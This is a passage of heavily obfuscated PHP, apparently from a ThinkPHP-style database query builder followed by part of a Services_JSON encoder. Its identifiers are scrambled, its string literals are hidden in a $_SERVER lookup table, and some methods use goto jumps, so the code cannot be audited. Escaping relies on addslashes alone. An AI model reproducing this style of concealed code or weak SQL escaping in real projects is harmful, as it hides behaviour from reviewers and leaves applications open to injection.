$Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[50] . $this->parseValue($aï˜±—òØ’[1]); } elseif (preg_match($Eâ“Ç‚à–‡[933], $aï˜±—òØ’[0])) { if (is_array($aï˜±—òØ’[1])) { $F‘¼®„ = isset($aï˜±—òØ’[2]) ? strtoupper($aï˜±—òØ’[2]) : $Eâ“Ç‚à–‡[918]; if (in_array($F‘¼®„, array($Eâ“Ç‚à–‡[917], $Eâ“Ç‚à–‡[918], $Eâ“Ç‚à–‡[919]))) { $bÎ«§â®Ä = array(); foreach ($aï˜±—òØ’[1] as $cÑŠ¡‰©“Â) { $bÎ«§â®Ä[] = $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[50] . $this->parseValue($cÑŠ¡‰©“Â); } $Eùš³İŒ .= $Eâ“Ç‚à–‡[245] . implode($Eâ“Ç‚à–‡[50] . $F‘¼®„ . $Eâ“Ç‚à–‡[50], $bÎ«§â®Ä) . $Eâ“Ç‚à–‡[819]; } } else { $Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[50] . $this->parseValue($aï˜±—òØ’[1]); } } elseif ($Eâ“Ç‚à–‡[282] == $E†¦¬‹¹â) { $Eùš³İŒ .= $Eâ“Ç‚à–‡[817] . $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $aï˜±—òØ’[1] . $Eâ“Ç‚à–‡[934]; } elseif (preg_match($Eâ“Ç‚à–‡[935], $aï˜±—òØ’[0])) { if (isset($aï˜±—òØ’[2]) && $Eâ“Ç‚à–‡[282] == $aï˜±—òØ’[2]) { $Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[50] . $aï˜±—òØ’[1]; } else { if (is_string($aï˜±—òØ’[1])) { $aï˜±—òØ’[1] = explode($Eâ“Ç‚à–‡[47], $aï˜±—òØ’[1]); } $F¬“­•ˆ¡ = implode($Eâ“Ç‚à–‡[47], $this->parseValue($aï˜±—òØ’[1])); $Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[817] . $F¬“­•ˆ¡ . $Eâ“Ç‚à–‡[819]; } } elseif (preg_match($Eâ“Ç‚à–‡[936], $aï˜±—òØ’[0])) { $aİ‘ñï§ÁÉ = is_string($aï˜±—òØ’[1]) ? explode($Eâ“Ç‚à–‡[47], $aï˜±—òØ’[1]) : $aï˜±—òØ’[1]; $Eùš³İŒ .= $Eâ“Ç‚à–‡[817] . $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $this->exp[$E†¦¬‹¹â] . $Eâ“Ç‚à–‡[50] . $this->parseValue($aİ‘ñï§ÁÉ[0]) . $Eâ“Ç‚à–‡[920] . $this->parseValue($aİ‘ñï§ÁÉ[1]) . $Eâ“Ç‚à–‡[263]; } else { think_exception(think_lang($Eâ“Ç‚à–‡[923]) . $Eâ“Ç‚à–‡[4] . $aï˜±—òØ’[0]); } } else { $B´Ë¦Á¬¯˜ = count($aï˜±—òØ’); $a‚ª”‡·‘á = isset($aï˜±—òØ’[$B´Ë¦Á¬¯˜ - 1]) ? strtoupper($aï˜±—òØ’[$B´Ë¦Á¬¯˜ - 1]) : $Eâ“Ç‚à–‡[33]; if (in_array($a‚ª”‡·‘á, array($Eâ“Ç‚à–‡[917], $Eâ“Ç‚à–‡[918], $Eâ“Ç‚à–‡[919]))) { $B´Ë¦Á¬¯˜ = $B´Ë¦Á¬¯˜ - 1; } else { $a‚ª”‡·‘á = $Eâ“Ç‚à–‡[917]; } for ($Díğ¨óò‡ƒ = 0; $Díğ¨óò‡ƒ < $B´Ë¦Á¬¯˜; $Díğ¨óò‡ƒ++) { $aİ‘ñï§ÁÉ = is_array($aï˜±—òØ’[$Díğ¨óò‡ƒ]) ? $aï˜±—òØ’[$Díğ¨óò‡ƒ][1] : $aï˜±—òØ’[$Díğ¨óò‡ƒ]; if ($Eâ“Ç‚à–‡[282] == strtolower($aï˜±—òØ’[$Díğ¨óò‡ƒ][0])) { $Eùš³İŒ .= $Eâ“Ç‚à–‡[245] . $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $aİ‘ñï§ÁÉ . $Eâ“Ç‚à–‡[934] . $a‚ª”‡·‘á . $Eâ“Ç‚à–‡[50]; } else { $DÓˆæÒ¼‹À = is_array($aï˜±—òØ’[$Díğ¨óò‡ƒ]) ? $this->exp[strtolower($aï˜±—òØ’[$Díğ¨óò‡ƒ][0])] : $Eâ“Ç‚à–‡[909]; if (!$DÓˆæÒ¼‹À && is_array($aï˜±—òØ’[$Díğ¨óò‡ƒ]) && in_array($aï˜±—òØ’[$Díğ¨óò‡ƒ][0], array($Eâ“Ç‚à–‡[909], $Eâ“Ç‚à–‡[927], $Eâ“Ç‚à–‡[928], $Eâ“Ç‚à–‡[929], $Eâ“Ç‚à–‡[930], $Eâ“Ç‚à–‡[931]))) { $DÓˆæÒ¼‹À = $aï˜±—òØ’[$Díğ¨óò‡ƒ][0]; } $Eùš³İŒ .= $Eâ“Ç‚à–‡[245] . $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $DÓˆæÒ¼‹À . $Eâ“Ç‚à–‡[50] . $this->parseValue($aİ‘ñï§ÁÉ) . $Eâ“Ç‚à–‡[934] . $a‚ª”‡·‘á . $Eâ“Ç‚à–‡[50]; } } $Eùš³İŒ = substr($Eùš³İŒ, 0, -4); } } else { $Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[937] . $this->parseValue($aï˜±—òØ’); } return $Eùš³İŒ; } protected function parseThinkWhere($Cƒ”ç…—Ä, $CÒÃ¯à¼) { $e÷ö’œÂò =& $_SERVER[Äº¡•ô™Ÿ]; $a¨š¬ßàœ™ = $e÷ö’œÂò[33]; switch ($Cƒ”ç…—Ä) { case $e÷ö’œÂò[336]: $a¨š¬ßàœ™ = $CÒÃ¯à¼; break; case $e÷ö’œÂò[921]: $a¨š¬ßàœ™ = is_string($CÒÃ¯à¼) ? $CÒÃ¯à¼ : substr($this->parseWhere($CÒÃ¯à¼), 6); break; case $e÷ö’œÂò[938]: parse_str($CÒÃ¯à¼, $f¿†•àùë¶); if (isset($f¿†•àùë¶[$e÷ö’œÂò[916]])) { $EĞ…¨–‘ù = $e÷ö’œÂò[50] . strtoupper($f¿†•àùë¶[$e÷ö’œÂò[916]]) . $e÷ö’œÂò[50]; unset($f¿†•àùë¶[$e÷ö’œÂò[916]]); } else { $EĞ…¨–‘ù = $e÷ö’œÂò[920]; } $b¬Àë¤á± = array(); foreach ($f¿†•àùë¶ as $Bã½Ÿ¢ÚØ‰ => $D•À‚çÏÀ£) { $b¬Àë¤á±[] = $this->parseKey($Bã½Ÿ¢ÚØ‰) . $e÷ö’œÂò[937] . $this->parseValue($D•À‚çÏÀ£); } $a¨š¬ßàœ™ = implode($EĞ…¨–‘ù, $b¬Àë¤á±); break; } return $a¨š¬ßàœ™; } protected function parseLimit($e¸Œ—ˆó§Ú) { $f„£·ÉùŞÑ =& $_SERVER[Äº¡•ô™Ÿ]; return !empty($e¸Œ—ˆó§Ú) ? $f„£·ÉùŞÑ[48] . $e¸Œ—ˆó§Ú . $f„£·ÉùŞÑ[50] : $f„£·ÉùŞÑ[33]; } protected function parseJoin($F¬äíÛ«Û ) { $Cœ’“öŸš… =& $_SERVER[Äº¡•ô™Ÿ]; $B¥ ¤¬˜´ = $Cœ’“öŸš…[33]; if (!empty($F¬äíÛ«Û )) { if (is_array($F¬äíÛ«Û )) { foreach ($F¬äíÛ«Û  as $AåÜÆìßƒ => $fƒò”š’ˆŠ) { if (!1 !== stripos($fƒò”š’ˆŠ, $Cœ’“öŸš…[939])) { $B¥ ¤¬˜´ .= $Cœ’“öŸš…[50] . $fƒò”š’ˆŠ; } else { $B¥ ¤¬˜´ .= $Cœ’“öŸš…[940] . $fƒò”š’ˆŠ; } } } else { $B¥ ¤¬˜´ .= $Cœ’“öŸš…[940] . $F¬äíÛ«Û ; } } $B¥ ¤¬˜´ = preg_replace($Cœ’“öŸš…[941], think_config($Cœ’“öŸš…[844]) . $Cœ’“öŸš…[942], $B¥ ¤¬˜´); return $B¥ ¤¬˜´; } protected function parseOrder($e‚÷®İî) { $fàâİŠâ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($e‚÷®İî)) { $D‡‰áÓõé„ = array(); foreach ($e‚÷®İî as $b•”‚ˆŠñ => $BïÎ‡­èÁ) { if (is_numeric($b•”‚ˆŠñ)) { $D‡‰áÓõé„[] = $this->parseKey($BïÎ‡­èÁ); } else { $BïÎ‡­èÁ = in_array(strtoupper(trim($BïÎ‡­èÁ)), array($fàâİŠâ[943], $fàâİŠâ[944])) ? $fàâİŠâ[50] . $BïÎ‡­èÁ : $fàâİŠâ[33]; if (preg_match($fàâİŠâ[945], $b•”‚ˆŠñ)) { $D‡‰áÓõé„[] = $this->parseKey($b•”‚ˆŠñ) . $BïÎ‡­èÁ; } else { think_exception($fàâİŠâ[946] . $b•”‚ˆŠñ); } } } $e‚÷®İî = implode($fàâİŠâ[47], $D‡‰áÓõé„); } return !empty($e‚÷®İî) ? $fàâİŠâ[947] . $e‚÷®İî : $fàâİŠâ[33]; } protected function parseGroup($EÎœ–¬µÊ«) { $AËõ­¬ÚØ® =& $_SERVER[Äº¡•ô™Ÿ]; return !empty($EÎœ–¬µÊ«) ? $AËõ­¬ÚØ®[948] . $EÎœ–¬µÊ« : $AËõ­¬ÚØ®[33]; } protected function parseHaving($fÕÏœèŒ•Ê) { $DÕ¾¡Ş™¶¡ =& $_SERVER[Äº¡•ô™Ÿ]; return !empty($fÕÏœèŒ•Ê) ? $DÕ¾¡Ş™¶¡[949] . $fÕÏœèŒ•Ê : $DÕ¾¡Ş™¶¡[33]; } protected function parseComment($AŒæÎ ºÊ) { $càŠìç†²¾ =& $_SERVER[Äº¡•ô™Ÿ]; return !empty($AŒæÎ ºÊ) ? $càŠìç†²¾[950] . $AŒæÎ ºÊ . $càŠìç†²¾[951] : $càŠìç†²¾[33]; } protected function parseDistinct($cù²À”¦Š) { $b¢ƒÅ–‰ =& $_SERVER[Äº¡•ô™Ÿ]; return !empty($cù²À”¦Š) ? $b¢ƒÅ–‰[952] : $b¢ƒÅ–‰[33]; } protected function parseUnion($a¨é‰ğÛ§) { $E·ŸªÂĞˆ¶ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($a¨é‰ğÛ§)) { return $E·ŸªÂĞˆ¶[33]; } if (isset($a¨é‰ğÛ§[$E·ŸªÂĞˆ¶[333]])) { $F­•ò÷Ş£‡ = $E·ŸªÂĞˆ¶[953]; unset($a¨é‰ğÛ§[$E·ŸªÂĞˆ¶[333]]); } else { $F­•ò÷Ş£‡ = $E·ŸªÂĞˆ¶[954]; } foreach ($a¨é‰ğÛ§ as $fö¯ˆÒ£¯) { $Béóª–æ¥[] = $F­•ò÷Ş£‡ . (is_array($fö¯ˆÒ£¯) ? $this->buildSelectSql($fö¯ˆÒ£¯) : $fö¯ˆÒ£¯); } return implode($E·ŸªÂĞˆ¶[50], $Béóª–æ¥); } public function insert($e½Ï³ñ²›î, $AÉŒí§¦Í = array(), $CÓ²ê•îº = false) { goto Aµßó–¶Š; F»­’ğÖë„: $cÇÒğ¾‡¤® .= $this->parseComment(!empty($AÉŒí§¦Í[$eØ¶¯î«ìÜ[338]]) ? $AÉŒí§¦Í[$eØ¶¯î«ìÜ[338]] : $eØ¶¯î«ìÜ[33]); return $this->execute($cÇÒğ¾‡¤®, $this->parseBind(!empty($AÉŒí§¦Í[$eØ¶¯î«ìÜ[270]]) ? $AÉŒí§¦Í[$eØ¶¯î«ìÜ[270]] : array())); goto Aë´öä½ò”; Aµßó–¶Š: $eØ¶¯î«ìÜ =& $_SERVER[Äº¡•ô™Ÿ]; $eÉø¸…ö¥ù = $D¶‰ŒÌ³‰Ô = array(); $this->model = $AÉŒí§¦Í[$eØ¶¯î«ìÜ[266]]; goto f½ö‰­Š˜; f½ö‰­Š˜: foreach ($e½Ï³ñ²›î as $dñ°Ÿ£øõ => $b•œÊÛÖÀõ) { if (is_array($b•œÊÛÖÀõ) && $eØ¶¯î«ìÜ[282] == $b•œÊÛÖÀõ[0]) { $D¶‰ŒÌ³‰Ô[] = $this->parseKey($dñ°Ÿ£øõ); $eÉø¸…ö¥ù[] = $b•œÊÛÖÀõ[1]; } elseif (is_scalar($b•œÊÛÖÀõ) || is_null($b•œÊÛÖÀõ)) { $D¶‰ŒÌ³‰Ô[] = $this->parseKey($dñ°Ÿ£øõ); $eÉø¸…ö¥ù[] = $this->parseValue($b•œÊÛÖÀõ); } } $cÇÒğ¾‡¤® = ($CÓ²ê•îº ? $eØ¶¯î«ìÜ[821] : $eØ¶¯î«ìÜ[822]) . $eØ¶¯î«ìÜ[823] . $this->parseTable($AÉŒí§¦Í[$eØ¶¯î«ìÜ[264]]) . $eØ¶¯î«ìÜ[817] . implode($eØ¶¯î«ìÜ[47], $D¶‰ŒÌ³‰Ô) . $eØ¶¯î«ìÜ[818] . implode($eØ¶¯î«ìÜ[47], $eÉø¸…ö¥ù) . $eØ¶¯î«ìÜ[819]; $cÇÒğ¾‡¤® .= $this->parseLock(isset($AÉŒí§¦Í[$eØ¶¯î«ìÜ[773]]) ? $AÉŒí§¦Í[$eØ¶¯î«ìÜ[773]] : !1); goto F»­’ğÖë„; Aë´öä½ò”: } public function selectInsert($c¯éŠæ‚¬ª, $EÅøøœÉ‘, $f™¥˜ò³ôÂ = array()) { goto CòÏŠÔºè; e’§»ˆ©ÓÒ: return $this->execute($dâ‘ÆöÏ—, $this->parseBind(!empty($f™¥˜ò³ôÂ[$fé­õê²Ì•[270]]) ? $f™¥˜ò³ôÂ[$fé­õê²Ì•[270]] : array())); goto e—Ñ™¦áĞÃ; eâ²½‡“Ş: array_walk($c¯éŠæ‚¬ª, array($this, $fé­õê²Ì•[820])); $dâ‘ÆöÏ— = $fé­õê²Ì•[955] . $this->parseTable($EÅøøœÉ‘) . $fé­õê²Ì•[817] . implode($fé­õê²Ì•[47], $c¯éŠæ‚¬ª) . $fé­õê²Ì•[934]; $dâ‘ÆöÏ— .= $this->buildSelectSql($f™¥˜ò³ôÂ); goto e’§»ˆ©ÓÒ; CòÏŠÔºè: $fé­õê²Ì• =& $_SERVER[Äº¡•ô™Ÿ]; $this->model = $f™¥˜ò³ôÂ[$fé­õê²Ì•[266]]; if (is_string($c¯éŠæ‚¬ª)) { $c¯éŠæ‚¬ª = explode($fé­õê²Ì•[47], $c¯éŠæ‚¬ª); } goto eâ²½‡“Ş; e—Ñ™¦áĞÃ: } public function update($F¿Ûô†İ›‰, $F­öôô›È) { $B¬ÊÚƒ“ñ =& $_SERVER[Äº¡•ô™Ÿ]; $this->model = $F­öôô›È[$B¬ÊÚƒ“ñ[266]]; $C…’½»¿Ôï = $B¬ÊÚƒ“ñ[956] . $this->parseTable($F­öôô›È[$B¬ÊÚƒ“ñ[264]]) . $this->parseSet($F¿Ûô†İ›‰) . $this->parseWhere(!empty($F­öôô›È[$B¬ÊÚƒ“ñ[260]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[260]] : $B¬ÊÚƒ“ñ[33]) . $this->parseOrder(!empty($F­öôô›È[$B¬ÊÚƒ“ñ[347]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[347]] : $B¬ÊÚƒ“ñ[33]) . $this->parseLimit(!empty($F­öôô›È[$B¬ÊÚƒ“ñ[277]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[277]] : $B¬ÊÚƒ“ñ[33]) . $this->parseLock(isset($F­öôô›È[$B¬ÊÚƒ“ñ[773]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[773]] : !1) . $this->parseComment(!empty($F­öôô›È[$B¬ÊÚƒ“ñ[338]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[338]] : $B¬ÊÚƒ“ñ[33]); return $this->execute($C…’½»¿Ôï, $this->parseBind(!empty($F­öôô›È[$B¬ÊÚƒ“ñ[270]]) ? $F­öôô›È[$B¬ÊÚƒ“ñ[270]] : array())); } public function delete($bÒÖã¢¹õ = array()) { $e ¹ªÍÅî =& $_SERVER[Äº¡•ô™Ÿ]; $this->model = $bÒÖã¢¹õ[$e ¹ªÍÅî[266]]; $Eç÷ÈÓïç = $e ¹ªÍÅî[957] . $this->parseTable($bÒÖã¢¹õ[$e ¹ªÍÅî[264]]) . $this->parseWhere(!empty($bÒÖã¢¹õ[$e ¹ªÍÅî[260]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[260]] : $e ¹ªÍÅî[33]) . $this->parseOrder(!empty($bÒÖã¢¹õ[$e ¹ªÍÅî[347]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[347]] : $e ¹ªÍÅî[33]) . $this->parseLimit(!empty($bÒÖã¢¹õ[$e ¹ªÍÅî[277]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[277]] : $e ¹ªÍÅî[33]) . $this->parseLock(isset($bÒÖã¢¹õ[$e ¹ªÍÅî[773]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[773]] : !1) . $this->parseComment(!empty($bÒÖã¢¹õ[$e ¹ªÍÅî[338]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[338]] : $e ¹ªÍÅî[33]); return $this->execute($Eç÷ÈÓïç, $this->parseBind(!empty($bÒÖã¢¹õ[$e ¹ªÍÅî[270]]) ? $bÒÖã¢¹õ[$e ¹ªÍÅî[270]] : array())); } public function select($F¼±¹İ“Ÿ = array()) { goto cõğÄà¢Ë; AÌÖ›Ìäô: $DÓ«ÒøâÄ– = isset($F¼±¹İ“Ÿ[$C‰˜˜¨§óÖ[334]]) ? $F¼±¹İ“Ÿ[$C‰˜˜¨§óÖ[334]] : !1; if ($DÓ«ÒøâÄ–) { $b‡êã§¯‹Ë = is_string($DÓ«ÒøâÄ–[$C‰˜˜¨§óÖ[89]]) ? $DÓ«ÒøâÄ–[$C‰˜˜¨§óÖ[89]] : $C‰˜˜¨§óÖ[958] . md5($b¿Ø‹›òœ); $e•˜á¸Õ   = think_cache($b‡êã§¯‹Ë, $C‰˜˜¨§óÖ[33], $DÓ«ÒøâÄ–); if (!1 !== $e•˜á¸Õ  ) { return $e•˜á¸Õ  ; } } $Eì»Ò«ƒÌ = $this->query($b¿Ø‹›òœ, $this->parseBind(!empty($F¼±¹İ“Ÿ[$C‰˜˜¨§óÖ[270]]) ? $F¼±¹İ“Ÿ[$C‰˜˜¨§óÖ[270]] : array())); goto aáù˜î§å¿; aáù˜î§å¿: if ($DÓ«ÒøâÄ– && !1 !== $Eì»Ò«ƒÌ) { think_cache($b‡êã§¯‹Ë, $Eì»Ò«ƒÌ, $DÓ«ÒøâÄ–); } return $Eì»Ò«ƒÌ; goto B‡ÊÆ¹÷¦; cõğÄà¢Ë: $C‰˜˜¨§óÖ =& $_SERVER[Äº¡•ô™Ÿ]; $this->model = $F¼±¹İ“Ÿ[$C‰˜˜¨§óÖ[266]]; $b¿Ø‹›òœ = $this->buildSelectSql($F¼±¹İ“Ÿ); goto AÌÖ›Ìäô; B‡ÊÆ¹÷¦: } public function buildSelectSql($CÅ¹ÂœÄ÷´ = array()) { goto Dø×µÙÁ°; D¡‘»È¨Ó: return $F†ÙòÇˆ¶ó; goto F¬ØÒÙò†á; CÃÓ‘¨î»Õ: $F†ÙòÇˆ¶ó = $this->parseSql($this->selectSql, $CÅ¹ÂœÄ÷´); $F†ÙòÇˆ¶ó .= $this->parseLock(isset($CÅ¹ÂœÄ÷´[$DĞìğÒÚ[773]]) ? $CÅ¹ÂœÄ÷´[$DĞìğÒÚ[773]] : !1); if (isset($DàÑ¨Ò‰í)) { think_cache($DàÑ¨Ò‰í, $F†ÙòÇˆ¶ó); } goto D¡‘»È¨Ó; Dø×µÙÁ°: $DĞìğÒÚ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($CÅ¹ÂœÄ÷´[$DĞìğÒÚ[337]])) { if (strpos($CÅ¹ÂœÄ÷´[$DĞìğÒÚ[337]], $DĞìğÒÚ[47])) { list($eµÁá¼Œµ”, $AæØğ†´) = explode($DĞìğÒÚ[47], $CÅ¹ÂœÄ÷´[$DĞìğÒÚ[337]]); } else { $eµÁá¼Œµ” = $CÅ¹ÂœÄ÷´[$DĞìğÒÚ[337]]; } $eµÁá¼Œµ” = $eµÁá¼Œµ” ? $eµÁá¼Œµ” : 1; $AæØğ†´ = isset($AæØğ†´) ? $AæØğ†´ : (is_numeric($CÅ¹ÂœÄ÷´[$DĞìğÒÚ[277]]) ? $CÅ¹ÂœÄ÷´[$DĞìğÒÚ[277]] : 20); $DÕŠÎ»ïµŞ = $AæØğ†´ * ((int) $eµÁá¼Œµ” - 1); $CÅ¹ÂœÄ÷´[$DĞìğÒÚ[277]] = $DÕŠÎ»ïµŞ . $DĞìğÒÚ[47] . $AæØğ†´; } if (think_config($DĞìğÒÚ[959])) { $DàÑ¨Ò‰í = $DĞìğÒÚ[960] . md5(serialize($CÅ¹ÂœÄ÷´)); $AšàÂÁøÍº = think_cache($DàÑ¨Ò‰í); if ($AšàÂÁøÍº) { return $AšàÂÁøÍº; } } goto CÃÓ‘¨î»Õ; F¬ØÒÙò†á: } public function parseSql($B«¤èÍ‡çä, $bÜÒÔ¢ĞÏ = array()) { $aÎù“àÕâ„ =& $_SERVER[Äº¡•ô™Ÿ]; $B«¤èÍ‡çä = str_replace(array($aÎù“àÕâ„[961], $aÎù“àÕâ„[962], $aÎù“àÕâ„[963], $aÎù“àÕâ„[964], $aÎù“àÕâ„[965], $aÎù“àÕâ„[966], $aÎù“àÕâ„[967], $aÎù“àÕâ„[968], $aÎù“àÕâ„[969], $aÎù“àÕâ„[970], $aÎù“àÕâ„[971]), array($this->parseTable("{$bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[264]]}"), $this->parseDistinct(isset($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[972]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[972]] : !1), $this->parseField(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[258]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[258]] : $aÎù“àÕâ„[173]), $this->parseJoin(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[267]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[267]] : $aÎù“àÕâ„[33]), $this->parseWhere(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[260]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[260]] : $aÎù“àÕâ„[33]), $this->parseGroup(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[973]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[973]] : $aÎù“àÕâ„[33]), $this->parseHaving(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[974]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[974]] : $aÎù“àÕâ„[33]), $this->parseOrder(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[347]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[347]] : $aÎù“àÕâ„[33]), $this->parseLimit(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[277]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[277]] : $aÎù“àÕâ„[33]), $this->parseUnion(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[332]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[332]] : $aÎù“àÕâ„[33]), $this->parseComment(!empty($bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[338]]) ? $bÜÒÔ¢ĞÏ[$aÎù“àÕâ„[338]] : $aÎù“àÕâ„[33])), $B«¤èÍ‡çä); return $B«¤èÍ‡çä; } public function getLastSql($B¨‚µ»¡¨È = '') { return $B¨‚µ»¡¨È ? $this->modelSql[$B¨‚µ»¡¨È] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fê—Ú¸–Ú) { return addslashes($fê—Ú¸–Ú); } public function setModel($BÖ½§¾ Ù) { $this->model = $BÖ½§¾ Ù; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto AÍ¹¢Şæ; CÃ©‘…¯ãô: define($_SERVER[Äº¡•ô™Ÿ][1913], 32); class Services_JSON { function __construct($Cö­ØÑ†£Æ = 0) { $this->use = $Cö­ØÑ†£Æ; } function utf162utf8($eÛÆßÌÊã) { $AïÙ¬ÒÀ³¤ =& $_SERVER[Äº¡•ô™Ÿ]; if (function_exists($AïÙ¬ÒÀ³¤[68])) { return mb_convert_encoding($eÛÆßÌÊã, $AïÙ¬ÒÀ³¤[1565], $AïÙ¬ÒÀ³¤[1914]); } $b¿ÙÕÜÚóÕ = ord($eÛÆßÌÊã[0]) << 8 | ord($eÛÆßÌÊã[1]); switch (!0) { case (127 & $b¿ÙÕÜÚóÕ) == $b¿ÙÕÜÚóÕ: return chr(127 & $b¿ÙÕÜÚóÕ); case (2047 & $b¿ÙÕÜÚóÕ) == $b¿ÙÕÜÚóÕ: return chr(192 | $b¿ÙÕÜÚóÕ >> 6 & 31) . chr(128 | $b¿ÙÕÜÚóÕ & 63); case (65535 & $b¿ÙÕÜÚóÕ) == $b¿ÙÕÜÚóÕ: return chr(224 | $b¿ÙÕÜÚóÕ >> 12 & 15) . chr(128 | $b¿ÙÕÜÚóÕ >> 6 & 63) . chr(128 | $b¿ÙÕÜÚóÕ & 63); } return $AïÙ¬ÒÀ³¤[33]; } function utf82utf16($DÃé•§‹†«) { $EˆÖØØ¡Ü =& $_SERVER[Äº¡•ô™Ÿ]; if (function_exists($EˆÖØØ¡Ü[68])) { return mb_convert_encoding($DÃé•§‹†«, $EˆÖØØ¡Ü[1914], $EˆÖØØ¡Ü[1565]); } switch (strlen($DÃé•§‹†«)) { case 1: return $DÃé•§‹†«; case 2: return chr(7 & ord($DÃé•§‹†«[0]) >> 2) . chr(192 & ord($DÃé•§‹†«[0]) << 6 | 63 & ord($DÃé•§‹†«[1])); case 3: return chr(240 & ord($DÃé•§‹†«[0]) << 4 | 15 & ord($DÃé•§‹†«[1]) >> 2) . chr(192 & ord($DÃé•§‹†«[1]) << 6 | 127 & ord($DÃé•§‹†«[2])); } return $EˆÖØØ¡Ü[33]; } function encode($C¡Œ§ìŠà›) { $aò±è‚…Î =& $_SERVER[Äº¡•ô™Ÿ]; switch (gettype($C¡Œ§ìŠà›)) { case $aò±è‚…Î[1576]: return $C¡Œ§ìŠà› ? $aò±è‚…Î[1575] : $aò±è‚…Î[1577]; case $aò±è‚…Î[1915]: return $aò±è‚…Î[101]; case $aò±è‚…Î[300]: return (int) $C¡Œ§ìŠà›; case $aò±è‚…Î[275]: case $aò±è‚…Î[274]: return (double) $C¡Œ§ìŠà›; case $aò±è‚…Î[309]: $b¢†­êÙ = $aò±è‚…Î[33]; $dµÉ½Ô”æ’ = strlen($C¡Œ§ìŠà›); for ($e¿¼ÚÇ¾ùó = 0; $e¿¼ÚÇ¾ùó < $dµÉ½Ô”æ’; ++$e¿¼ÚÇ¾ùó) { $B¶‚Ğì¼¦Ì = ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó]); switch (!0) { case $B¶‚Ğì¼¦Ì == 8: $b¢†­êÙ .= $aò±è‚…Î[1916]; break; case $B¶‚Ğì¼¦Ì == 9: $b¢†­êÙ .= $aò±è‚…Î[1552]; break; case $B¶‚Ğì¼¦Ì == 10: $b¢†­êÙ .= $aò±è‚…Î[1550]; break; case $B¶‚Ğì¼¦Ì == 12: $b¢†­êÙ .= $aò±è‚…Î[1917]; break; case $B¶‚Ğì¼¦Ì == 13: $b¢†­êÙ .= $aò±è‚…Î[1551]; break; case $B¶‚Ğì¼¦Ì == 34: case $B¶‚Ğì¼¦Ì == 47: case $B¶‚Ğì¼¦Ì == 92: $b¢†­êÙ .= $aò±è‚…Î[95] . $C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó]; break; case $B¶‚Ğì¼¦Ì >= 32 && $B¶‚Ğì¼¦Ì <= 127: $b¢†­êÙ .= $C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó]; break; case ($B¶‚Ğì¼¦Ì & 224) == 192: $B¸›ö¤óÅ‰ = pack($aò±è‚…Î[1918], $B¶‚Ğì¼¦Ì, ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 1])); $e¿¼ÚÇ¾ùó += 1; $D¥§Ğ‡¼Œ’ = $this->utf82utf16($B¸›ö¤óÅ‰); $b¢†­êÙ .= sprintf($aò±è‚…Î[1919], bin2hex($D¥§Ğ‡¼Œ’)); break; case ($B¶‚Ğì¼¦Ì & 240) == 224: $B¸›ö¤óÅ‰ = pack($aò±è‚…Î[1918], $B¶‚Ğì¼¦Ì, ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 1]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 2])); $e¿¼ÚÇ¾ùó += 2; $D¥§Ğ‡¼Œ’ = $this->utf82utf16($B¸›ö¤óÅ‰); $b¢†­êÙ .= sprintf($aò±è‚…Î[1919], bin2hex($D¥§Ğ‡¼Œ’)); break; case ($B¶‚Ğì¼¦Ì & 